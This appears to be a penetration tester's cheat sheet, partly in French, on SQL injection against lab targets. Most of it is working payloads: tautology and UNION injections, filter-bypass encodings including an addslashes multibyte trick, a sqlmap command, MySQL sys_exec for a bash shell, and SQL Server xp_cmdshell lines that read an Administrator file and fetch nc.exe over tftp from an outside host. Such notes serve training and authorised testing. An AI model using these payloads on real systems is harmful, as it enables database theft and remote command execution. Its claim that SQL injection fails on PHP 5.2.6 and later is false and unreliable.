# SQLi : SQL Injection


````sql
SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
````
- Close the string : ' "
- Widen the request : or 1=1
- Add inputs with UNION
- Comment end of request : -- #

````
http://12.0.0.11/sqli/example1.php?name=root' or '1'='1
http://12.0.0.11/sqli/example1.php?name=root' or '1'=1
http://12.0.0.11/sqli/example1.php?name=root’ or 1=1-- -
http://12.0.0.11/sqli/example1.php?name=root%27%20or%20%271%27=%271
````

## SqlMap

Url: http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection/
````
http://10.10.10.129/sqli/example1.php?name=root' or 1=1-- -

sqlmap -u "http://10.10.10.129/sqli/example1.php?name=root" --dbs --banner
````

## Avoid simple filters
### Limit returned results
````
a' or 1=1 LIMIT 1 #
````

Replace Space by Tab %09 
````
username=admin%27%09or%091%3D1%09--%09&password=admin
````

Bypass php function ‘addslashes’ used to insert strings in mysql requests
Use Chinese charset %bf%27  to set a ' in proxy
````
username=a%bf%27+or+1=1+#&password=b
````

Filter sur AND ou OR, les remplacer par
````
AND :   &&   %26%26 
OR  :  || 
````
Filtrage sur les Espaces -> newlines %A0, utiliser des \t TAB %90 , utiliser /**/
````
http://12.0.0.11/sqli/example2.php?name=root%27%A0or%A01=1--%A0-
````
Filter with : mysql_real_escape_string
````
$iId = mysql_real_escape_string("1 OR 1=1");
http://12.0.0.11/sqli/example4.php?id=2 OR  1=1
````

### Note: PHP <=5.2.6
SQL Injection won't work on PHP >= v5.2.6.
Unless php tuned for
````
<IfModule mod_php5.c>
    magic_quotes_gpc = Off
    allow_url_fopen = On
    allow_url_include = On
</IfModule>
````



### Use Union
````
http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1
http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2
http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2,3,4
````
Identify number of fields in select: here 1,2,3,4 doesn’t generate error


## MySql

````
select sys_exec(‘/bin/bash’);
after bash access, “bash –p” or “sudo su”
````

##  SQL Server 

Connect to:
````
sqsh -S hostname -Uusername -Ppassword
use database;
go
select * from tblTable;
go
````

If xp_cmdshell is enabled
````
exec master..xp_cmdshell 'type c:\"Documents and Settings"\Administrator\Desktop\proof.txt'
go
EXEC master..xp_cmdshell 'tftp -i 192.168.168.168 GET nc.exe'
go
````